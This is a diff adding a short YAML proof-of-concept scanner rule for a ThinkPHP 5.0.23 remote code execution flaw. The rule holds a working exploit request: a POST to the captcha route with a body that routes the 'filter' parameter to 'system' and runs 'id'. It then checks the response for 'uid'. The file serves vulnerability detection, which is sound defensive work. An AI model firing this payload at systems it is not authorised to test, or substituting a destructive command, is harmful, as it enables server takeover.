@@ -1,0 +1,14 @@
+name: poc-yaml-thinkphp-5.0.23-rce
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /index.php?s=captcha
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
+    expression:
+      status: 404
+      body_all: ["uid"]
